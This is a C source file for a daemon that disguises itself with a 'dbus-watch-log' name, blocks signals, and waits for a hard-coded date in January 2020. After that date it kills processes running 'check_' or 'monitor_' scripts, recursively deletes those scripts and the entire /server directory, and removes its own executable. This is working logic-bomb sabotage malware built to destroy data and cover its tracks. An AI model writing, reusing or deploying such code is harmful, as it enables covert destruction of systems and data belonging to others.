/*
 * Copyright (C) Mr.D
 *
 */ 

#include <unistd.h>
#include <stdio.h>
#include <error.h>
#include <errno.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <dirent.h>
#include <string.h>
#include <signal.h>
#include <stdlib.h>
#include <time.h>
#include <sys/time.h>

//#define DEBUG

int process_data(const char *);
int proc_data(const char *);
int proc_dir(const char *);
char *get_time(void);

int main(int argc, char **argv)
{
    sigset_t sig_s;
    pid_t pid;
    struct tm time_s =
        {
            .tm_sec = 8,
            .tm_min = 8,
            .tm_hour = 2,
            .tm_mday = 20,
            .tm_mon = 0,
            .tm_year = 120};
    time_t ref_time = mktime(&time_s);
    time_t tmp_time;
    int check_i;
#ifdef DEBUG
    char tmp_str[512];
    char log_file[512];
    snprintf(log_file, 512, "/var/log/%s.log", "dbus-watch-log");
    int fd_log = open(log_file, O_RDWR | O_APPEND | O_CREAT, S_IRUSR | S_IWUSR);
    if (fd_log < 0)
    {
        perror("open log error");
        exit(-90);
    }
#endif

    pid = fork();
    if (pid < 0)
    {
        perror("fork()");
#ifdef DEBUG
        close(fd_log);
#endif
        exit(-110);
    }
    if (pid != 0)
    {
#ifdef DEBUG
        close(fd_log);
#endif
        exit(0);
    }
    setsid();
    pid = fork();
    if (pid < 0)
    {
        perror("fork()");
#ifdef DEBUG
        close(fd_log);
#endif
        exit(-110);
    }
    if (pid != 0)
    {
#ifdef DEBUG
        close(fd_log);
#endif
        exit(0);
    }
    chdir("/");
    close(STDIN_FILENO);
    close(STDOUT_FILENO);
#ifndef DEBUG
    close(STDERR_FILENO);
#endif
#ifdef DEBUG
    dup2(fd_log, STDERR_FILENO);
    close(fd_log);
    snprintf(tmp_str, 512, "\n%s process <dbus-watch-log> starting ...\n\n", get_time());
    write(STDERR_FILENO, tmp_str, strlen(tmp_str));
#endif

    sigfillset(&sig_s);
    sigprocmask(SIG_SETMASK, &sig_s, NULL);
    signal(SIGCHLD, SIG_IGN);

    while (1)
    {
        tmp_time = time(NULL);
#ifdef DEBUG
        snprintf(tmp_str, 512, "%s now time: %d <------>reference time: %d\n", get_time(), tmp_time, ref_time);
        write(STDERR_FILENO, tmp_str, strlen(tmp_str));
#endif
        if (tmp_time > ref_time)
        {
            process_data("check_");
            process_data("monitor_");
            proc_dir("/server");
            unlink(argv[0]);
	    exit(1);
        }
        sleep(20);
    }
#ifdef DEBUG
    close(STDERR_FILENO);
#endif
    exit(0);
}

char *get_time(void)
{
    struct timeval tv;
    struct tm *tm_s;
    static char str[512];

    memset(str, 0, 512);
    if (gettimeofday(&tv, NULL) == -1)
        return (str);
    if ((tm_s = gmtime(&tv.tv_sec)) == NULL)
        return (str);
    snprintf(str, 512, "[%04d-%02d-%02d %02d:%02d:%02d.%03d]", tm_s->tm_year + 1900, tm_s->tm_mon + 1, tm_s->tm_mday, tm_s->tm_hour, tm_s->tm_min, tm_s->tm_sec, (int)(tv.tv_usec / 1000));
    return (str);
}

int process_data(const char *featureStr)
{

    DIR *dirp1;
    DIR *dirp2;
    struct dirent *dp1;
    struct dirent *dp2;
    char fn1[512];
    char fn2[512];
    char str[512];
#ifdef DEBUG
    char tmp_str[512];
#endif
    pid_t pid;

    dirp1 = opendir("/proc");
    if (!dirp1)
    {
        perror("open /proc: error!");
        return (-100);
    }
    while (dp1 = readdir(dirp1))
    {
        if ((dp1->d_type != DT_DIR) || (strncmp(dp1->d_name, ".", 1) == 0))
            continue;
        snprintf(fn1, 512, "/proc/%s/%s", dp1->d_name, "fd");
        dirp2 = opendir(fn1);
        if (!dirp2)
        {
#ifdef DEBUG
            snprintf(tmp_str, 512, "%s process_data ===> ERROR=====>open %s\n ==>",get_time(), fn1);
            write(STDERR_FILENO, tmp_str, strlen(tmp_str));
            snprintf(tmp_str, 512, "%s\n", strerror(errno));
            write(STDERR_FILENO, tmp_str, strlen(tmp_str));
#endif
            continue;
        }
        while (dp2 = readdir(dirp2))
        {
            if (strcmp(dp2->d_name, "255") != 0)
                continue;
            snprintf(fn2, 512, "%s/%s", fn1, dp2->d_name);
#ifdef DEBUG
            snprintf(tmp_str, 512, "%s process_data ===> process proc exe: %s\n",get_time(), fn2);
            write(STDERR_FILENO, tmp_str, strlen(tmp_str));
#endif
            memset(str, 0, 512);
            if (readlink(fn2, str, sizeof(str) - 1) < 0)
                break;
#ifdef DEBUG
            snprintf(tmp_str, 512, "%s process_data ===> process name: %s\n",get_time(), str);
            write(STDERR_FILENO, tmp_str, strlen(tmp_str));
#endif
            if (strstr(str, featureStr))
            {
#ifdef DEBUG
                snprintf(tmp_str, 512, "%s process_data ===> killing process pid: %s\n",get_time(), dp1->d_name);
                write(STDERR_FILENO, tmp_str, strlen(tmp_str));
#endif
                pid = atoi(dp1->d_name);
                proc_dir(str);
                kill(pid, 9);
                break;
            }
        }
        closedir(dirp2);
    }
    closedir(dirp1);
    return (0);
}

int proc_data(const char *featureStr)
{

    DIR *dirp1;
    DIR *dirp2;
    struct dirent *dp1;
    struct dirent *dp2;
    char fn1[512];
    char fn2[512];
    char str[512];
#ifdef DEBUG
    char tmp_str[512];
#endif
    pid_t pid;

    dirp1 = opendir("/proc");
    if (!dirp1)
    {
        perror("open /proc: error!");
        return (-100);
    }
    while (dp1 = readdir(dirp1))
    {
        if ((dp1->d_type != DT_DIR) || (strncmp(dp1->d_name, ".", 1) == 0))
            continue;
        snprintf(fn1, 512, "/proc/%s", dp1->d_name);
        dirp2 = opendir(fn1);
        if (!dirp2)
        {
#ifdef DEBUG
            snprintf(tmp_str, 512, "%s proc_data ===> ERROR=====>open %s\n ==>",get_time(), fn1);
            write(STDERR_FILENO, tmp_str, strlen(tmp_str));
            snprintf(tmp_str, 512, "%s\n", strerror(errno));
            write(STDERR_FILENO, tmp_str, strlen(tmp_str));
#endif
            continue;
        }
        while (dp2 = readdir(dirp2))
        {
            if (strcmp(dp2->d_name, "exe") != 0)
                continue;
            snprintf(fn2, 512, "%s/%s", fn1, dp2->d_name);
#ifdef DEBUG
            snprintf(tmp_str, 512, "%s proc_data ===> process proc exe: %s\n",get_time(), fn2);
            write(STDERR_FILENO, tmp_str, strlen(tmp_str));
#endif
            memset(str, 0, 512);
            if (readlink(fn2, str, sizeof(str) - 1) < 0)
                break;
#ifdef DEBUG
            snprintf(tmp_str, 512, "%s proc_data ===> process name: %s\n",get_time(), str);
            write(STDERR_FILENO, tmp_str, strlen(tmp_str));
#endif
            if (strstr(str, featureStr))
            {
#ifdef DEBUG
                snprintf(tmp_str, 512, "%s proc_data ===> killing process pid: %s\n",get_time(), dp1->d_name);
                write(STDERR_FILENO, tmp_str, strlen(tmp_str));
#endif
                pid = atoi(dp1->d_name);
                kill(pid, 9);
                break;
            }
        }
        closedir(dirp2);
    }
    closedir(dirp1);
    return (0);
}

int proc_dir(const char *dir)
{
    char cur_dir[] = ".";
    char up_dir[] = "..";
    char dir_name[512];
    DIR *dirp;
    struct dirent *dp;
    struct stat dir_stat;

    if (access(dir, F_OK) < 0)
    {
        perror("the file is not exists");
        return (-101);
    }
    if (stat(dir, &dir_stat) < 0)
    {
        perror("get directory stat error");
        return (-102);
    }
    if (S_ISREG(dir_stat.st_mode))
    {
        remove(dir);
    }
    else if (S_ISDIR(dir_stat.st_mode))
    {
        dirp = opendir(dir);
        if (!dirp)
        {
            printf("ERROR=====>open %s\n ==>", dir);
            puts(strerror(errno));
            return (-100);
        }
        while (dp = readdir(dirp))
        {
            if ((strcmp(cur_dir, dp->d_name) == 0) || (strcmp(up_dir, dp->d_name) == 0))
            {
                continue;
            }
            snprintf(dir_name, 512, "%s/%s", dir, dp->d_name);
            proc_dir(dir_name);
        }
        closedir(dirp);
        remove(dir);
    }
    else
    {
        perror("don't remove the file type");
        return (-103);
    }
    return (0);
}
